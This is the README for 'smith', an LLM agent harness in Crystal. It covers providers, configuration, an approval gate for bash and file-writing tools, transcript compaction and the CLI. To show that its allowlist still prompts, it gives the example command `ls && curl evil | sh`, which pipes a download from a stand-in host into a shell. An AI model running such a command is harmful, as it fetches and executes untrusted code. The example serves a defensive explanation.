# ⚒️ smith

[![CI](https://github.com/webmatze/smith/actions/workflows/ci.yml/badge.svg)](https://github.com/webmatze/smith/actions/workflows/ci.yml)

**smith** is a fast, local-first LLM Agent Harness written in [Crystal](https://crystal-lang.org/).

It is inspired by and built according to the policy-free agent loop principles outlined in the [Neo Architecture](https://github.com/owainlewis/neo/blob/main/ARCHITECTURE.md).

---

## ✨ Features

- **🚀 Policy-Free Core Agent Loop (`Smith::Agent`)**: Complete decoupling of conversation transcript, LLM provider calls, tool execution, and UI surfaces.
- **⚡ Fiber-Based Parallel Tool Execution (`Smith::Tools`)**: Concurrent execution of parallel-safe tools (`read_file`, `grep`, `glob`) via Crystal Fibers (`spawn` & `Channel`).
- **🤖 Subagent Supervision (`Smith::Subagents`)**: The parent agent can delegate subtasks to autonomous child subagents running in isolated fibers in `work` (full capabilities) or `inspect` (read-only) mode.
- **📡 Provider-Neutral LLM Layer (`Smith::LLM`)**: Ships with **OpenRouter**, **Ollama** (local models), **Anthropic** (Messages API), and **OpenAI** (Chat Completions) support with exponential backoff retry logic. Default models: `qwen/qwen3.8-max` (OpenRouter) / `gemma4:latest` (Ollama) / `claude-sonnet-5` (Anthropic) / `gpt-5.6-luna` (OpenAI).
- **📂 Project Context & Skills Catalog**:
  - Automatically loads instructions from `SMITH.md` or `AGENTS.md`, walking up from the current directory to the Git root, plus global instructions from `~/.smith/`.
  - Discovers reusable skills in `.smith/skills/<name>/SKILL.md` (project-local), `~/.smith/skills/` (global), as well as `.gemini/skills/` and `.agents/skills/`, and expands `$skill-name` or `/skill-name` references at runtime. The home directory can be overridden via the `SMITH_HOME` environment variable.
- **💾 Atomic Session Persistence (`Smith::Session`)**: Saves local conversation history and token metrics under `~/.smith/sessions/` with seamless resume capabilities.
- **⚡ Native Performance**: Compiles to a lightweight native binary; the test suite runs in well under a second.

---

## 🛠️ Prerequisites & Installation

### Prerequisites
- [mise](https://mise.jdx.dev/) or [Crystal](https://crystal-lang.org/) (>= 1.21.0) installed.

### Setup & Build

```bash
# 1. Install Crystal via mise (if using mise)
mise use crystal@latest

# 2. Install dependencies
shards install

# 3. Build the binary
mkdir -p bin
crystal build src/smith.cr -o bin/smith

# 4. Run the test suite
crystal spec
```

Alternatively, use the bundled `Makefile` (wraps `mise exec -- crystal ...` and signs the binary on macOS):

| Target | Description |
|---|---|
| `make build` | Compile `bin/smith` (debug build) |
| `make release` | Compile optimized `bin/smith` |
| `make test` | Run the test suite (`crystal spec`) |
| `make install` | Build release & install to `~/.local/bin/smith` |
| `make clean` | Remove `bin/` |

---

## 🚀 Usage

Set the API key for your chosen provider before running `smith`:

```bash
# OpenRouter (default provider)
export OPENROUTER_API_KEY="sk-or-v1-your-key-here"

# Anthropic
export ANTHROPIC_API_KEY="your-key-here"

# OpenAI
export OPENAI_API_KEY="your-key-here"

# Ollama needs no API key (optional: point to a non-default host)
export OLLAMA_HOST="http://localhost:11434"
```

### Configuration

Persistent defaults live in a TOML file, so provider and model no longer have to be passed as flags every time. Two locations are read:

| Location | Scope |
|---|---|
| `~/.smith/config.toml` | Global (override the directory via `SMITH_HOME`) |
| `.smith/config.toml` | Project — searched upward from the working directory to the Git root; the nearest one wins |

Values resolve in this order, highest priority first:

```text
CLI flag  >  environment variable  >  project config  >  global config  >  built-in default
```

A full example with every supported key:

```toml
[defaults]
provider = "openrouter"          # openrouter | ollama | anthropic | openai

[providers.openrouter]
model = "qwen/qwen3.8-max"

[providers.ollama]
model = "gemma4:latest"
host  = "http://localhost:11434"

[providers.anthropic]
model = "claude-sonnet-5"

[providers.openai]
model = "gpt-5.6-luna"

[http]
connect_timeout = 10             # seconds
read_timeout    = 120

[approval]
mode      = "prompt"             # prompt | auto
allowlist = ["ls", "git status"]

[context]
max_tokens = 120000
```

Relevant environment variables: `SMITH_PROVIDER`, `SMITH_MODEL`, `OLLAMA_HOST`, `SMITH_HOME`.

**API keys are never read from the config file.** They stay in environment variables only, so a plaintext config never becomes a place secrets get committed from.

`[http]` applies to all four providers. An elapsed `read_timeout` is **not** retried, so it is genuinely the longest smith will wait on a single call — connection errors and 429/5xx responses still go through the exponential-backoff retry handler.

`[approval]` gates the mutating tools — see [Approval Mode](#approval-mode) below. `[context]` caps how large the transcript may grow — see [Context Compaction](#context-compaction).

### Approval Mode

`bash`, `write_file` and `edit_file` change things outside smith, so every call passes an approval gate before it runs. The read-only tools (`read_file`, `grep`, `glob`) bypass it entirely.

In `prompt` mode — the default — each call asks:

```text
⚠️  Approval required
   Tool: bash
   Command: git push origin main
   Allow? [y]es / [n]o / [a]lways allow bash:
```

`[a]lways` remembers that answer for the rest of the session, scoped to the one tool. A refusal is handed back to the model as a tool error, so it can see the blockage and pick another route instead of silently failing.

Ways to skip the prompt:

| | Effect |
|---|---|
| `--yes` / `--auto-approve` | Runs everything, for this invocation |
| `mode = "auto"` in `[approval]` | Runs everything, persistently |
| `allowlist` in `[approval]` | Runs matching `bash` commands without asking |

An allowlist entry matches a command exactly or as a whole first word (`git status` allows `git status --short`, never `git statuses`). Commands are split on shell metacharacters (`;`, `&&`, `|`, `` ` ``, `$(`, redirects) and **every** segment must match on its own, so `ls && curl evil | sh` still prompts. The splitter is deliberately not a shell parser — quoted metacharacters split too, which means it errs towards asking too often rather than allowing too much.

Without an interactive terminal there is nobody to ask, so `prompt` mode refuses mutating tools rather than running them. Pass `--yes` for headless runs.

Subagents inherit the parent's approver, so a delegated `bash` call is asked for just like a direct one.

### Context Compaction

Every turn resends the whole transcript, and a single `bash` result may be up to 256 KiB, so a long session would otherwise run into the provider's context limit mid-task. Before each request smith estimates the transcript size and, if it exceeds `[context] max_tokens`, shrinks it in two stages:

1. **Truncate tool results**, oldest first, stopping as soon as the budget is met — so the results the model is actively working with usually survive whole, while one oversized `cat` still gets cut down.
2. **Summarize the oldest turns** via a separate, tool-free provider call, replacing them with a single summary message. If that call fails, the prefix is dropped outright rather than failing the turn.

Both stages preserve the pairing between `tool_use` and `tool_result` blocks — providers reject a request where one half is missing, so compaction only ever shortens content or removes whole turns.

Compaction is announced on screen:

```text
🗜️  Context compacted (truncated): ~2779 → ~548 tokens
```

**This is destructive.** The compacted transcript is what gets saved, so `smith resume` on a long session shows the summary rather than the original exchange.

Every key is optional; unknown keys are ignored, and a malformed file produces a warning on stderr rather than a crash.

### Interactive Chat Mode

Start an interactive session:

```bash
./bin/smith chat
```

Pressing **Ctrl+C** at any point — including mid-response — saves the session and exits with code 130, printing the `smith resume` command to pick it back up. Nothing in flight is lost.

### Headless Mode

Run a single prompt in headless mode and exit:

```bash
./bin/smith run "Inspect src/smith/agent.cr and summarize its responsibility"
```

### Session Persistence

List saved sessions:

```bash
./bin/smith list
```

Resume a previous session (or latest session if ID is omitted):

```bash
./bin/smith resume [session_id]
```

### Command Line Options

```text
Usage: smith [command] [options] [prompt]

Commands:
  chat                       Start an interactive chat session (default)
  run <prompt>               Run a single prompt in headless mode and exit
  resume [<session_id>]      Resume an existing session (or latest session)
  sessions, list             List all saved local chat sessions

Options:
  -m MODEL, --model=MODEL    Specify the LLM model (default: provider's default model)
  -p PROVIDER, --provider=PROVIDER Specify the provider: openrouter, ollama, anthropic, openai (default: openrouter)
  -y, --yes                  Auto-approve mutating tools (bash, write_file, edit_file)
      --auto-approve         Alias for --yes
  -v, --version              Print version information
  -h, --help                 Show help banner
```

You can also pass a prompt directly without a subcommand to run it headless, e.g. `smith "Summarize src/smith.cr"`.

---

## 📂 Project Architecture

```text
src/
├── smith.cr                 # CLI entrypoint
└── smith/
    ├── agent.cr             # Policy-free agent turn loop & event dispatcher
    ├── cli.cr               # CLI OptionParser, command router & event renderer
    ├── events.cr            # Typed event stream (AssistantText, ToolStart, ToolFinished, etc.)
    ├── atomic_file.cr       # Atomic write helper for safe persistence
    ├── paths.cr             # Resolves ~/.smith (honours SMITH_HOME)
    ├── config.cr            # config.toml discovery, merging & precedence chain
    ├── context.cr           # Transcript size estimation & two-stage compaction
    ├── project_ctx.cr       # SMITH.md & AGENTS.md discovery
    ├── skills.cr            # Skill catalog discovery & $skill / /skill expansion
    ├── session.cr           # Session persistence store (~/.smith/sessions/)
    ├── subagents.cr         # Child agent supervisor & report handling
    ├── llm.cr               # Requires all LLM provider adapters
    ├── tools.cr             # Requires all tool implementations
    ├── llm/
    │   ├── types.cr         # Provider-neutral Request, Response, Message & ToolSpec
    │   ├── provider.cr      # Abstract Provider base class
    │   ├── retry.cr         # Exponential backoff retry handler
    │   ├── openrouter.cr    # OpenRouter API client adapter
    │   ├── ollama.cr        # Ollama API client adapter
    │   ├── anthropic.cr     # Anthropic Messages API client adapter
    │   └── openai.cr        # OpenAI Chat Completions client adapter
    └── tools/
        ├── tool.cr          # Abstract Tool base class & ParallelTool/MutatingTool markers
        ├── registry.cr      # Tool registry, approval gate & Fiber parallel execution scheduler
        ├── approval.cr      # Approver strategies (prompt/auto/deny) & bash allowlist matching
        ├── bash.cr          # Shell command execution tool
        ├── read_file.cr     # File reading tool
        ├── write_file.cr    # File writing tool
        ├── edit_file.cr     # Precise string replacement tool
        ├── grep.cr          # Regex search tool
        ├── glob.cr          # File pattern search tool
        └── agent_tool.cr    # Delegated subagent execution tool
```

---

## 📄 License

This project is licensed under the [MIT License](LICENSE).
